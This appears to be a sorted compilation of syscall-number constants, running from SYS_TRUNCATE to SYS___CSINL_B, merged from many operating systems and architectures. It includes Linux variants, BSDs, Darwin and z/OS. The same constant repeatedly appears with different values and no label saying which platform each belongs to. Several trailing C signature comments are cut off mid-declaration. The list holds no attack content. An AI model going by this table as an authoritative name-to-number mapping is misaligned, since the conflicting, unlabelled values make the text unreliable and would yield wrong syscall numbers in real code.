SYS_TRUNCATE             = 200 // { int
SYS_TRUNCATE       = 200 // { int sys_truncate(const char 
SYS_TRUNCATE64                   = 193
SYS_TRUNCATE64                   = 4211
SYS_TRUNCD128                       = 0xC40
SYS_TRUNCD32                        = 0xC3E
SYS_TRUNCD64                        = 0xC3F
SYS_TRUNCF                          = 0x892
SYS_TRUNCL                          = 0x894
SYS_TSEARCH                         = 0x2CD
SYS_TSEMACQUIRE = 52
SYS_TTYNAME                         = 0x1D6
SYS_TTYNAME_R                       = 0x5EC
SYS_TTYSLOT                         = 0x32D
SYS_TUXCALL                      = 225
SYS_TUXCALL                 = 184
SYS_TUXCALL                 = 225
SYS_TWALK                           = 0x2CE
SYS_TW_FCNTL                        = 0x211
SYS_TW_OPEN                         = 0x210
SYS_TZSET                           = 0x1D7
SYS_T_ACCEPT                        = 0x409
SYS_T_ALLOC                         = 0x40A
SYS_T_BIND                          = 0x40B
SYS_T_CLOSE                         = 0x40C
SYS_T_CONNECT                       = 0x40D
SYS_T_ERROR                         = 0x40E
SYS_T_FREE                          = 0x40F
SYS_T_GETINFO                       = 0x410
SYS_T_GETPROTADDR                   = 0x411
SYS_T_GETSTATE                      = 0x412
SYS_T_LISTEN                        = 0x413
SYS_T_LOOK                          = 0x414
SYS_T_OPEN                          = 0x415
SYS_T_OPTMGMT                       = 0x416
SYS_T_RCV                           = 0x417
SYS_T_RCVCONNECT                    = 0x418
SYS_T_RCVDIS                        = 0x419
SYS_T_RCVREL                        = 0x41A
SYS_T_RCVUDATA                      = 0x41B
SYS_T_RCVUDERR                      = 0x41C
SYS_T_SND                           = 0x41D
SYS_T_SNDDIS                        = 0x41E
SYS_T_SNDREL                        = 0x41F
SYS_T_SNDUDATA                      = 0x420
SYS_T_STRERROR                      = 0x421
SYS_T_SYNC                          = 0x422
SYS_T_UNBIND                        = 0x423
SYS_UALARM                          = 0x2F1
SYS_UGETRLIMIT                   = 190
SYS_UGETRLIMIT                   = 191
SYS_UGETRLIMIT              = 190
SYS_ULIMIT                          = 0x36C
SYS_ULIMIT                       = 4058
SYS_ULIMIT                       = 58
SYS_ULIMIT                  = 58
SYS_ULOCK_WAIT                     = 515
SYS_ULOCK_WAKE                     = 516
SYS_UMASK                           = 0x1D8
SYS_UMASK                          = 60
SYS_UMASK                        = 4060
SYS_UMASK                        = 60
SYS_UMASK                    = 60  // { int umask(int newmask)
SYS_UMASK                   = 166
SYS_UMASK                   = 5093
SYS_UMASK                   = 60
SYS_UMASK                   = 95
SYS_UMASK                  = 60  // { int umask(int newmask)
SYS_UMASK                = 60  // { mode_t
SYS_UMASK          = 60  // { mode_t sys_umask(mode_t newmask)
SYS_UMASK_EXTENDED                 = 278
SYS_UMOUNT                          = 0x1D9
SYS_UMOUNT                       = 22
SYS_UMOUNT                       = 4022
SYS_UMOUNT                  = 159
SYS_UMOUNT                  = 22
SYS_UMOUNT2                      = 4052
SYS_UMOUNT2                      = 52
SYS_UMOUNT2                 = 166
SYS_UMOUNT2                 = 39
SYS_UMOUNT2                 = 45
SYS_UMOUNT2                 = 5161
SYS_UMOUNT2                 = 52
SYS_UMTX_SLEEP             = 469 // { int umtx_sleep(volatile const int 
SYS_UMTX_WAKEUP            = 470 // { int umtx_wakeup(volatile const int 
SYS_UNAME                           = 0x1DA
SYS_UNAME                        = 122
SYS_UNAME                        = 4122
SYS_UNAME                   = 122
SYS_UNAME                   = 160
SYS_UNAME                   = 189
SYS_UNAME                   = 5061
SYS_UNAME                   = 63
SYS_UNATEXIT                        = 0x7B5
SYS_UNDELETE                       = 205
SYS_UNDELETE                 = 205 // { int undelete(char 
SYS_UNDELETE               = 205 // { int undelete(char 
SYS_UNDELETE             = 205 // { int
SYS_UNDOEXPO                        = 0x5A2
SYS_UNDOEXPORTWORKUNIT              = 0x5A2
SYS_UNDOIMPO                        = 0x5A4
SYS_UNDOIMPORTWORKUNIT              = 0x5A4
SYS_UNGETC                          = 0x080
SYS_UNGETC_UNLOCKED                 = 0xCC3
SYS_UNGETWC                         = 0x144
SYS_UNGETWC_UNLOCKED                = 0xCC4
SYS_UNLINK                          = 0x1DB
SYS_UNLINK                         = 10
SYS_UNLINK                       = 10
SYS_UNLINK                       = 4010
SYS_UNLINK                   = 10  // { int unlink(char 
SYS_UNLINK                  = 10
SYS_UNLINK                  = 5085
SYS_UNLINK                  = 87
SYS_UNLINK                 = 10  // { int unlink(char 
SYS_UNLINK               = 10  // { int
SYS_UNLINK         = 10  // { int sys_unlink(const char 
SYS_UNLINKAT                       = 472
SYS_UNLINKAT                     = 292
SYS_UNLINKAT                     = 301
SYS_UNLINKAT                     = 328
SYS_UNLINKAT                     = 4294
SYS_UNLINKAT                = 263
SYS_UNLINKAT                = 290
SYS_UNLINKAT                = 292
SYS_UNLINKAT                = 294
SYS_UNLINKAT                = 35
SYS_UNLINKAT                = 5253
SYS_UNLINKAT             = 471 // { int
SYS_UNLOCKPT                        = 0x37B
SYS_UNMOUNT                        = 159
SYS_UNMOUNT                  = 22  // { int unmount(char 
SYS_UNMOUNT                = 22  // { int unmount(char 
SYS_UNMOUNT              = 22  // { int
SYS_UNMOUNT        = 22  // { int sys_unmount(const char 
SYS_UNMOUNT     = 35
SYS_UNSETENV                        = 0xB34
SYS_UNSHARE                      = 282
SYS_UNSHARE                      = 310
SYS_UNSHARE                      = 337
SYS_UNSHARE                      = 4303
SYS_UNSHARE                 = 272
SYS_UNSHARE                 = 282
SYS_UNSHARE                 = 299
SYS_UNSHARE                 = 303
SYS_UNSHARE                 = 5262
SYS_UNSHARE                 = 97
SYS_UNUSED109                    = 4109
SYS_UNUSED150                    = 4150
SYS_UNUSED18                     = 4018
SYS_UNUSED28                     = 4028
SYS_UNUSED59                     = 4059
SYS_UNUSED84                     = 4084
SYS_UNVEIL         = 114 // { int sys_unveil(const char 
SYS_USELIB                       = 4086
SYS_USELIB                       = 86
SYS_USELIB                  = 134
SYS_USELIB                  = 203
SYS_USELIB                  = 86
SYS_USERFAULTFD                  = 364
SYS_USERFAULTFD                  = 374
SYS_USERFAULTFD                  = 388
SYS_USERFAULTFD                  = 4357
SYS_USERFAULTFD             = 282
SYS_USERFAULTFD             = 323
SYS_USERFAULTFD             = 352
SYS_USERFAULTFD             = 355
SYS_USERFAULTFD             = 364
SYS_USERFAULTFD             = 5317
SYS_USLEEP                          = 0x2F2
SYS_USRCTL                         = 445
SYS_USTAT                        = 4062
SYS_USTAT                        = 62
SYS_USTAT                   = 136
SYS_USTAT                   = 168
SYS_USTAT                   = 5133
SYS_USTAT                   = 62
SYS_UTIME                           = 0x1DC
SYS_UTIME                        = 30
SYS_UTIME                        = 4030
SYS_UTIME                   = 132
SYS_UTIME                   = 30
SYS_UTIME                   = 5130
SYS_UTIMENSAT                    = 304
SYS_UTIMENSAT                    = 320
SYS_UTIMENSAT                    = 348
SYS_UTIMENSAT                    = 4316
SYS_UTIMENSAT               = 280
SYS_UTIMENSAT               = 304
SYS_UTIMENSAT               = 310
SYS_UTIMENSAT               = 315
SYS_UTIMENSAT               = 5275
SYS_UTIMENSAT               = 88
SYS_UTIMENSAT            = 467 // { int
SYS_UTIMENSAT_TIME64             = 412
SYS_UTIMENSAT_TIME64             = 4412
SYS_UTIMES                          = 0x36E
SYS_UTIMES                         = 138
SYS_UTIMES                       = 251
SYS_UTIMES                       = 269
SYS_UTIMES                       = 271
SYS_UTIMES                       = 4267
SYS_UTIMES                   = 138 // { int utimes(char 
SYS_UTIMES                  = 138
SYS_UTIMES                  = 235
SYS_UTIMES                  = 251
SYS_UTIMES                  = 313
SYS_UTIMES                  = 5226
SYS_UTIMES                 = 138 // { int utimes(char 
SYS_UTIMES               = 420 // { int
SYS_UTIMES         = 76  // { int sys_utimes(const char 
SYS_UTRACE                   = 335 // { int utrace(const void 
SYS_UTRACE                 = 335 // { int utrace(const void 
SYS_UTRACE               = 306 // { int
SYS_UTRACE         = 209 // { int sys_utrace(const char 
SYS_UTRAP_INSTALL           = 164
SYS_UUIDGEN                  = 392 // { int uuidgen(struct uuid 
SYS_UUIDGEN                = 392 // { int uuidgen(struct uuid 
SYS_UUIDGEN              = 355 // { int
SYS_VADVISE              = 72  // { int
SYS_VFORK                           = 0x30F
SYS_VFORK                          = 66
SYS_VFORK                        = 189
SYS_VFORK                        = 190
SYS_VFORK                    = 66  // { int vfork(void)
SYS_VFORK                   = 189
SYS_VFORK                   = 190
SYS_VFORK                   = 58
SYS_VFORK                   = 66
SYS_VFORK                  = 66  // { pid_t vfork(void)
SYS_VFORK                = 66  // { int
SYS_VFORK          = 66  // { int sys_vfork(void)
SYS_VFPRINTF                        = 0x073
SYS_VFPRINTF_UNLOCKED               = 0xCC5
SYS_VFSCANF                         = 0x944
SYS_VFSCANF_UNLOCKED                = 0xCC7
SYS_VFS_PURGE                      = 455
SYS_VFWPRINT                        = 0x7D3
SYS_VFWPRINTF                       = 0x7D3
SYS_VFWPRINTF_UNLOCKED              = 0xCC9
SYS_VFWSCANF                        = 0x94A
SYS_VFWSCANF_UNLOCKED               = 0xCCB
SYS_VHANGUP                      = 111
SYS_VHANGUP                      = 4111
SYS_VHANGUP                 = 111
SYS_VHANGUP                 = 153
SYS_VHANGUP                 = 5150
SYS_VHANGUP                 = 58
SYS_VHANGUP                 = 76
SYS_VM86                         = 113
SYS_VM86                         = 166
SYS_VM86                         = 4113
SYS_VM86                    = 113
SYS_VM86OLD                      = 113
SYS_VMM_GUEST_SYNC_ADDR    = 535 // { int vmm_guest_sync_addr(long 
SYS_VMSPACE_CREATE         = 486 // { int vmspace_create(void 
SYS_VMSPACE_CTL            = 488 // { int vmspace_ctl(void 
SYS_VMSPACE_DESTROY        = 487 // { int vmspace_destroy(void 
SYS_VMSPACE_MCONTROL       = 491 // { int vmspace_mcontrol(void 
SYS_VMSPACE_MMAP           = 489 // { int vmspace_mmap(void 
SYS_VMSPACE_MUNMAP         = 490 // { int vmspace_munmap(void 
SYS_VMSPACE_PREAD          = 492 // { ssize_t vmspace_pread(void 
SYS_VMSPACE_PWRITE         = 493 // { ssize_t vmspace_pwrite(void 
SYS_VMSPLICE                     = 285
SYS_VMSPLICE                     = 316
SYS_VMSPLICE                     = 343
SYS_VMSPLICE                     = 4307
SYS_VMSPLICE                = 25
SYS_VMSPLICE                = 278
SYS_VMSPLICE                = 285
SYS_VMSPLICE                = 309
SYS_VMSPLICE                = 5266
SYS_VMSPLICE                = 75
SYS_VM_PRESSURE_MONITOR            = 296
SYS_VPRINTF                         = 0x074
SYS_VPRINTF_UNLOCKED                = 0xCCD
SYS_VQUOTACTL              = 530 // { int vquotactl(const char 
SYS_VSCANF                          = 0x946
SYS_VSCANF_UNLOCKED                 = 0xCCF
SYS_VSERVER                      = 273
SYS_VSERVER                      = 313
SYS_VSERVER                      = 4277
SYS_VSERVER                 = 236
SYS_VSERVER                 = 267
SYS_VSERVER                 = 5236
SYS_VSNPRINTF                       = 0x8DB
SYS_VSPRINTF                        = 0x075
SYS_VSSCANF                         = 0x948
SYS_VSWPRINT                        = 0x136
SYS_VSWPRINTF                       = 0x136
SYS_VSWSCANF                        = 0x94E
SYS_VWPRINTF                        = 0x7D4
SYS_VWPRINTF_UNLOCKED               = 0xCD1
SYS_VWSCANF                         = 0x94C
SYS_VWSCANF_UNLOCKED                = 0xCD3
SYS_WAIT                            = 0x1DD
SYS_WAIT3                           = 0x2A7
SYS_WAIT4                          = 7
SYS_WAIT4                        = 114
SYS_WAIT4                        = 4114
SYS_WAIT4                   = 114
SYS_WAIT4                   = 260
SYS_WAIT4                   = 5059
SYS_WAIT4                   = 61
SYS_WAIT4                   = 7
SYS_WAIT4                = 449 // { int
SYS_WAIT4_NOCANCEL                 = 400
SYS_WAITEVENT                      = 232
SYS_WAITID                          = 0x2A8
SYS_WAITID                         = 173
SYS_WAITID                       = 272
SYS_WAITID                       = 280
SYS_WAITID                       = 284
SYS_WAITID                       = 4278
SYS_WAITID                  = 247
SYS_WAITID                  = 272
SYS_WAITID                  = 279
SYS_WAITID                  = 281
SYS_WAITID                  = 5237
SYS_WAITID                  = 95
SYS_WAITID_NOCANCEL                = 416
SYS_WAITPID                         = 0x1DE
SYS_WAITPID                      = 4007
SYS_WAITPID                      = 7
SYS_WAITPID                 = 212
SYS_WAITPID                 = 7
SYS_WATCHEVENT                     = 231
SYS_WCRTOMB                         = 0x114
SYS_WCSCAT                          = 0x087
SYS_WCSCHR                          = 0x088
SYS_WCSCMP                          = 0x089
SYS_WCSCOLL                         = 0x130
SYS_WCSCPY                          = 0x086
SYS_WCSCSPN                         = 0x08B
SYS_WCSFTIME                        = 0x134
SYS_WCSLEN                          = 0x08C
SYS_WCSNCAT                         = 0x08D
SYS_WCSNCMP                         = 0x08A
SYS_WCSNCPY                         = 0x08F
SYS_WCSPBRK                         = 0x23F
SYS_WCSRCHR                         = 0x240
SYS_WCSRTOMB                        = 0x115
SYS_WCSRTOMBS                       = 0x115
SYS_WCSSPN                          = 0x08E
SYS_WCSSTR                          = 0x11B
SYS_WCSTOD                          = 0x12E
SYS_WCSTOD128                       = 0xC43
SYS_WCSTOD32                        = 0xC41
SYS_WCSTOD64                        = 0xC42
SYS_WCSTOF                          = 0x959
SYS_WCSTOIMAX                       = 0x954
SYS_WCSTOK                          = 0x12C
SYS_WCSTOL                          = 0x12D
SYS_WCSTOLD                         = 0x95A
SYS_WCSTOLL                         = 0x5CC
SYS_WCSTOMBS                        = 0x082
SYS_WCSTOUL                         = 0x12F
SYS_WCSTOULL                        = 0x5CD
SYS_WCSTOUMAX                       = 0x955
SYS_WCSWCS                          = 0x242
SYS_WCSWIDTH                        = 0x132
SYS_WCSXFRM                         = 0x131
SYS_WCTOB                           = 0x110
SYS_WCTOMB                          = 0x084
SYS_WCTRANS                         = 0x7D7
SYS_WCTYPE                          = 0x10B
SYS_WCWIDTH                         = 0x133
SYS_WMEMCHR                         = 0x395
SYS_WMEMCMP                         = 0x396
SYS_WMEMCPY                         = 0x397
SYS_WMEMMOVE                        = 0x398
SYS_WMEMSET                         = 0x399
SYS_WORDEXP                         = 0x310
SYS_WORDFREE                        = 0x311
SYS_WORKQ_KERNRETURN               = 368
SYS_WORKQ_OPEN                     = 367
SYS_WORK_INTERVAL_CTL              = 499
SYS_WPRINTF                         = 0x7D2
SYS_WPRINTF_UNLOCKED                = 0xCD5
SYS_WRITE                           = 0x1DF
SYS_WRITE                          = 4
SYS_WRITE                        = 4
SYS_WRITE                        = 4004
SYS_WRITE                   = 1
SYS_WRITE                   = 4
SYS_WRITE                   = 5001
SYS_WRITE                   = 64
SYS_WRITE                = 4   // { ssize_t
SYS_WRITEV                          = 0x369
SYS_WRITEV                         = 121
SYS_WRITEV                       = 146
SYS_WRITEV                       = 4146
SYS_WRITEV                  = 121
SYS_WRITEV                  = 146
SYS_WRITEV                  = 20
SYS_WRITEV                  = 5019
SYS_WRITEV                  = 66
SYS_WRITEV               = 121 // { ssize_t
SYS_WRITEV_NOCANCEL                = 412
SYS_WRITE_NOCANCEL                 = 397
SYS_WSCANF                          = 0x7D6
SYS_WSCANF_UNLOCKED                 = 0xCD6
SYS_WSTAT       = 44
SYS_W_GETMNTENT                     = 0x19B
SYS_W_GETPSENT                      = 0x1B1
SYS_W_IOCTL                         = 0x1A2
SYS_W_STATFS                        = 0x1CA
SYS_W_STATVFS                       = 0x36B
SYS_Y0                              = 0x029
SYS_Y1                              = 0x02A
SYS_YIELD                    = 321 // { int yield(void)
SYS_YIELD                  = 321 // { int yield(void)
SYS_YN                              = 0x027
SYS__EXIT                           = 0x174
SYS__FLUSHLBF                       = 0xD68
SYS__FLUSHLBF_UNLOCKED              = 0xD6F
SYS__LLSEEK                      = 140
SYS__LLSEEK                      = 4140
SYS__LLSEEK                 = 140
SYS__LLSEEK                 = 236
SYS__LONGJMP                        = 0x30D
SYS__LWP_CONTINUE        = 314 // { int
SYS__LWP_CREATE          = 309 // { int
SYS__LWP_CTL             = 325 // { int
SYS__LWP_DETACH          = 319 // { int
SYS__LWP_EXIT            = 310 // { int
SYS__LWP_GETNAME         = 324 // { int
SYS__LWP_GETPRIVATE      = 316 // { void 
SYS__LWP_KILL            = 318 // { int
SYS__LWP_PARK            = 434 // { int
SYS__LWP_SELF            = 311 // { lwpid_t
SYS__LWP_SETNAME         = 323 // { int
SYS__LWP_SETPRIVATE      = 317 // { void
SYS__LWP_SUSPEND         = 313 // { int
SYS__LWP_UNPARK          = 321 // { int
SYS__LWP_UNPARK_ALL      = 322 // { ssize_t
SYS__LWP_WAIT            = 312 // { int
SYS__LWP_WAKEUP          = 315 // { int
SYS__NEWSELECT                   = 142
SYS__NEWSELECT                   = 4142
SYS__NEWSELECT              = 142
SYS__NEWSELECT              = 230
SYS__NEWSELECT              = 5022
SYS__PSET_BIND           = 415 // { int
SYS__SCHED_GETAFFINITY   = 349 // { int
SYS__SCHED_GETPARAM      = 347 // { int
SYS__SCHED_SETAFFINITY   = 348 // { int
SYS__SCHED_SETPARAM      = 346 // { int
SYS__SETJMP                         = 0x30E
SYS__SYSCTL                      = 149
SYS__SYSCTL                      = 4153
SYS__SYSCTL                 = 149
SYS__SYSCTL                 = 156
SYS__SYSCTL                 = 251
SYS__SYSCTL                 = 5152
SYS__UMTX_OP                 = 454 // { int _umtx_op(void 
SYS___A2E_L                         = 0x741
SYS___A2E_S                         = 0x733
SYS___A64L_A                        = 0x70C
SYS___ABORT                         = 0x05C
SYS___ABSF_B                        = 0x62A
SYS___ABSF_H                        = 0x8E7
SYS___ABSL_B                        = 0x62C
SYS___ABSL_H                        = 0x8E8
SYS___ABS_B                         = 0x62B
SYS___ABS_H                         = 0x8E6
SYS___ACCEPT_A                      = 0x832
SYS___ACCEPT_AND_RECV_A             = 0x833
SYS___ACCESS_A                      = 0x71F
SYS___ACL_ACLCHECK_FILE      = 353 // { int __acl_aclcheck_file(const char 
SYS___ACL_ACLCHECK_FILE    = 353 // { int __acl_aclcheck_file(const char 
SYS___ACL_ACLCHECK_LINK      = 428 // { int __acl_aclcheck_link(const char 
SYS___ACL_DELETE_FILE        = 351 // { int __acl_delete_file(const char 
SYS___ACL_DELETE_FILE      = 351 // { int __acl_delete_file(const char 
SYS___ACL_DELETE_LINK        = 427 // { int __acl_delete_link(const char 
SYS___ACL_GET_FILE           = 347 // { int __acl_get_file(const char 
SYS___ACL_GET_FILE         = 347 // { int __acl_get_file(const char 
SYS___ACL_GET_LINK           = 425 // { int __acl_get_link(const char 
SYS___ACL_SET_FILE           = 348 // { int __acl_set_file(const char 
SYS___ACL_SET_FILE         = 348 // { int __acl_set_file(const char 
SYS___ACL_SET_LINK           = 426 // { int __acl_set_link(const char 
SYS___ACOSF_B                       = 0x616
SYS___ACOSF_H                       = 0x8EA
SYS___ACOSHF_B                      = 0x843
SYS___ACOSHF_H                      = 0xA54
SYS___ACOSHL_B                      = 0x844
SYS___ACOSHL_H                      = 0xA55
SYS___ACOSH_B                       = 0x4DA
SYS___ACOSH_H                       = 0x8EC
SYS___ACOSL_B                       = 0x617
SYS___ACOSL_H                       = 0x8EB
SYS___ACOS_B                        = 0x4D9
SYS___ACOS_H                        = 0x8E9
SYS___AE_AUTOCONVERT_STATE          = 0x667
SYS___AE_CORRESTBL_QUERY            = 0x666
SYS___AE_THREAD_SETMODE             = 0x791
SYS___AE_THREAD_SWAPMODE            = 0x792
SYS___ASCTIME_A                     = 0x79C
SYS___ASCTIME_R_A                   = 0x7A1
SYS___ASINF_B                       = 0x618
SYS___ASINF_H                       = 0x8EE
SYS___ASINHF_B                      = 0x845
SYS___ASINHF_H                      = 0xA56
SYS___ASINHL_B                      = 0x846
SYS___ASINHL_H                      = 0xA57
SYS___ASINH_B                       = 0x4BE
SYS___ASINH_H                       = 0x8F0
SYS___ASINL_B                       = 0x619
SYS___ASINL_H                       = 0x8EF
SYS___ASIN_B                        = 0x4DB
SYS___ASIN_H                        = 0x8ED
SYS___ATAN2F_B                      = 0x61A
SYS___ATAN2F_H                      = 0x8F8
SYS___ATAN2L_B                      = 0x61B
SYS___ATAN2L_H                      = 0x8F9
SYS___ATAN2_B                       = 0x4DC
SYS___ATAN2_H                       = 0x8F7
SYS___ATANF_B                       = 0x602
SYS___ATANF_H                       = 0x8F2
SYS___ATANHF_B                      = 0x847
SYS___ATANHF_H                      = 0x8F5
SYS___ATANHL_B                      = 0x848
SYS___ATANHL_H                      = 0x8F6
SYS___ATANH_B                       = 0x4DD
SYS___ATANH_H                       = 0x8F4
SYS___ATANL_B                       = 0x603
SYS___ATANL_H                       = 0x8F3
SYS___ATANPID128                    = 0xC6D
SYS___ATANPID32                     = 0xC6B
SYS___ATANPID64                     = 0xC6C
SYS___ATAN_B                        = 0x4BF
SYS___ATAN_H                        = 0x8F1
SYS___ATOE                          = 0x2DB
SYS___ATOE_L                        = 0x2DC
SYS___ATOF_A                        = 0x705
SYS___ATOI_A                        = 0x706
SYS___ATOL_A                        = 0x707
SYS___BASENAME_A                    = 0x7DC
SYS___BIND_A                        = 0x834
SYS___BTOWC_A                       = 0x7E4
SYS___CABEND                        = 0x83D
SYS___CABSF_B                       = 0x992
SYS___CABSF_H                       = 0x993
SYS___CABSL_B                       = 0x995
SYS___CABSL_H                       = 0x996
SYS___CABS_B                        = 0x98F
SYS___CABS_H                        = 0x990
SYS___CACOSF_B                      = 0x99B
SYS___CACOSF_H                      = 0x99C
SYS___CACOSHF_B                     = 0x9A4
SYS___CACOSHF_H                     = 0x9A5
SYS___CACOSHL_B                     = 0x9A7
SYS___CACOSHL_H                     = 0x9A8
SYS___CACOSH_B                      = 0x9A1
SYS___CACOSH_H                      = 0x9A2
SYS___CACOSL_B                      = 0x99E
SYS___CACOSL_H                      = 0x99F
SYS___CACOS_B                       = 0x998
SYS___CACOS_H                       = 0x999
SYS___CARGF_B                       = 0x9AD
SYS___CARGF_H                       = 0x9AE
SYS___CARGL_B                       = 0x9B0
SYS___CARGL_H                       = 0x9B1
SYS___CARG_B                        = 0x9AA
SYS___CARG_H                        = 0x9AB
SYS___CASINF_B                      = 0x9B6
SYS___CASINF_H                      = 0x9B7
SYS___CASINHF_B                     = 0x9BF
SYS___CASINHF_H                     = 0x9C0
SYS___CASINHL_B                     = 0x9C2
SYS___CASINHL_H                     = 0x9C3
SYS___CASINH_B                      = 0x9BC
SYS___CASINH_H                      = 0x9BD
SYS___CASINL_B                      = 0x9B9
SYS___CASINL_H                      = 0x9BA
SYS___CASIN_B                       = 0x9B3
SYS___CASIN_H                       = 0x9B4
SYS___CATANF_B                      = 0x9C8
SYS___CATANF_H                      = 0x9C9
SYS___CATANHF_B                     = 0x9D1
SYS___CATANHF_H                     = 0x9D2
SYS___CATANHL_B                     = 0x9D4
SYS___CATANHL_H                     = 0x9D5
SYS___CATANH_B                      = 0x9CE
SYS___CATANH_H                      = 0x9CF
SYS___CATANL_B                      = 0x9CB
SYS___CATANL_H                      = 0x9CC
SYS___CATAN_B                       = 0x9C5
SYS___CATAN_H                       = 0x9C6
SYS___CATCHMATCH                    = 0x261
SYS___CATGETS_A                     = 0x6C0
SYS___CATOPEN_A                     = 0x71E
SYS___CATTRM                        = 0x2A9
SYS___CBRTF_B                       = 0x849
SYS___CBRTF_H                       = 0xA58
SYS___CBRTL_B                       = 0x84A
SYS___CBRTL_H                       = 0xA59
SYS___CBRT_B                        = 0x4C0
SYS___CBRT_H                        = 0x8FA
SYS___CCOSF_B                       = 0x9DA
SYS___CCOSF_H                       = 0x9DB
SYS___CCOSHF_B                      = 0x9E3
SYS___CCOSHF_H                      = 0x9E4
SYS___CCOSHL_B                      = 0x9E6
SYS___CCOSHL_H                      = 0x9E7
SYS___CCOSH_B                       = 0x9E0
SYS___CCOSH_H                       = 0x9E1
SYS___CCOSL_B                       = 0x9DD
SYS___CCOSL_H                       = 0x9DE
SYS___CCOS_B                        = 0x9D7
SYS___CCOS_H                        = 0x9D8
SYS___CCSIDTYPE                     = 0x665
SYS___CDUMP                         = 0x0C4
SYS___CDUMP_A                       = 0x7B7
SYS___CEE3DMP_A                     = 0x7B6
SYS___CEILF_B                       = 0x604
SYS___CEILF_H                       = 0x7F4
SYS___CEILL_B                       = 0x605
SYS___CEILL_H                       = 0x7F5
SYS___CEIL_B                        = 0x4C1
SYS___CEIL_H                        = 0x7EA
SYS___CERTIFICATE                   = 0x502
SYS___CEXPF_B                       = 0x9EC
SYS___CEXPF_H                       = 0x9ED
SYS___CEXPL_B                       = 0x9EF
SYS___CEXPL_H                       = 0x9F0
SYS___CEXP_B                        = 0x9E9
SYS___CEXP_H                        = 0x9EA
SYS___CHANNEL_GET_INFO             = 511
SYS___CHANNEL_GET_OPT              = 513
SYS___CHANNEL_OPEN                 = 510
SYS___CHANNEL_SET_OPT              = 514
SYS___CHANNEL_SYNC                 = 512
SYS___CHARMAP_INIT_A                = 0x66E
SYS___CHATTR                        = 0x660
SYS___CHAUDIT_A                     = 0x6F4
SYS___CHDIR_A                       = 0x720
SYS___CHECKSCHENV_A                 = 0x766
SYS___CHECK_RESOURCE_AUTH_NP        = 0x392
SYS___CHKBFP                        = 0x52F
SYS___CHMOD_A                       = 0x6E8
SYS___CHOWN_A                       = 0x721
SYS___CHROOT_A                      = 0x722
SYS___CIMAGF_B                      = 0x9F5
SYS___CIMAGF_H                      = 0x9F6
SYS___CIMAGL_B                      = 0x9F8
SYS___CIMAGL_H                      = 0x9F9
SYS___CIMAG_B                       = 0x9F2
SYS___CIMAG_H                       = 0x9F3
SYS___CLASS                         = 0xAFA
SYS___CLASS2                        = 0xB99
SYS___CLASS2D128                    = 0xC99
SYS___CLASS2D32                     = 0xC97
SYS___CLASS2D64                     = 0xC98
SYS___CLASS2F                       = 0xC91
SYS___CLASS2F_B                     = 0xC93
SYS___CLASS2F_H                     = 0xC94
SYS___CLASS2L                       = 0xC92
SYS___CLASS2L_B                     = 0xC95
SYS___CLASS2L_H                     = 0xC96
SYS___CLASS2_B                      = 0xB9A
SYS___CLASS2_H                      = 0xB9B
SYS___CLASS_B                       = 0xAFB
SYS___CLASS_H                       = 0xAFC
SYS___CLEAN2UPCATCH                 = 0x262
SYS___CLEANUPCATCH                  = 0x260
SYS___CLOG                          = 0x9FA
SYS___CLOGF_B                       = 0x9FE
SYS___CLOGF_H                       = 0x9FF
SYS___CLOGL_B                       = 0xA01
SYS___CLOGL_H                       = 0xA02
SYS___CLOG_B                        = 0x9FB
SYS___CLOG_H                        = 0x9FC
SYS___CLONE              = 287 // { pid_t
SYS___CLRENV                        = 0x0C9
SYS___CLRMF                         = 0x0BD
SYS___CNVBLK                        = 0x2AF
SYS___CODEPAGE_INFO                 = 0xC64
SYS___COLLATE_INIT_A                = 0x6AC
SYS___CONFSTR_A                     = 0x74B
SYS___CONJF_B                       = 0xA07
SYS___CONJF_H                       = 0xA08
SYS___CONJL_B                       = 0xA0A
SYS___CONJL_H                       = 0xA0B
SYS___CONJ_B                        = 0xA04
SYS___CONJ_H                        = 0xA05
SYS___CONNECTSERVER_A               = 0x767
SYS___CONNECTWORKMGR_A              = 0x768
SYS___CONNECT_A                     = 0x835
SYS___CONSOLE                       = 0x482
SYS___CONSOLE2                      = 0x5D2
SYS___CONVERT_ID_NP                 = 0x393
SYS___COPYSIGNF_B                   = 0x84B
SYS___COPYSIGNF_H                   = 0x8FB
SYS___COPYSIGNL_B                   = 0x84C
SYS___COPYSIGNL_H                   = 0x8FC
SYS___COPYSIGN_B                    = 0xA5A
SYS___COPYSIGN_H                    = 0xAF5
SYS___COSF_B                        = 0x606
SYS___COSF_H                        = 0x8FE
SYS___COSHF_B                       = 0x61C
SYS___COSHF_H                       = 0x900
SYS___COSHL_B                       = 0x61D
SYS___COSHL_H                       = 0x901
SYS___COSH_B                        = 0x4DE
SYS___COSH_H                        = 0x942
SYS___COSL_B                        = 0x607
SYS___COSL_H                        = 0x8FF
SYS___COSPID128                     = 0xC70
SYS___COSPID32                      = 0xC6E
SYS___COSPID64                      = 0xC6F
SYS___COS_B                         = 0x4C3
SYS___COS_H                         = 0x8FD
SYS___COTAN                         = 0x879
SYS___COTANF                        = 0x878
SYS___COTANF_B                      = 0x84D
SYS___COTANF_H                      = 0x903
SYS___COTANL                        = 0x87A
SYS___COTANL_B                      = 0x84F
SYS___COTANL_H                      = 0x904
SYS___COTAN_B                       = 0x84E
SYS___COTAN_H                       = 0x902
SYS___CPL                           = 0x5A6
SYS___CPOWF_B                       = 0xA10
SYS___CPOWF_H                       = 0xA11
SYS___CPOWL_B                       = 0xA13
SYS___CPOWL_H                       = 0xA14
SYS___CPOW_B                        = 0xA0D
SYS___CPOW_H                        = 0xA0E
SYS___CPROJF_B                      = 0xA19
SYS___CPROJF_H                      = 0xA1A
SYS___CPROJL_B                      = 0xA1C
SYS___CPROJL_H                      = 0xA1D
SYS___CPROJ_B                       = 0xA16
SYS___CPROJ_H                       = 0xA17
SYS___CREALF_B                      = 0xA22
SYS___CREALF_H                      = 0xA23
SYS___CREALL_B                      = 0xA25
SYS___CREALL_H                      = 0xA26
SYS___CREAL_B                       = 0xA1F
SYS___CREAL_H                       = 0xA20
SYS___CREATEWORKUNIT_A              = 0x76A
SYS___CREAT_A                       = 0x6F6
SYS___CREAT_O_A                     = 0x78E
SYS___CRYPT_A                       = 0x7BE
SYS___CRYTRM                        = 0x2B0
SYS___CSID                          = 0x116
SYS___CSID_A                        = 0x680
SYS___CSID_STD_A                    = 0x681
SYS___CSINF_B                       = 0xA2B
SYS___CSINF_H                       = 0xA2C
SYS___CSINHF_B                      = 0xA34
SYS___CSINHF_H                      = 0xA35
SYS___CSINHL_B                      = 0xA37
SYS___CSINHL_H                      = 0xA38
SYS___CSINH_B                       = 0xA31
SYS___CSINH_H                       = 0xA32
SYS___CSINL_B                       = 0xA2E
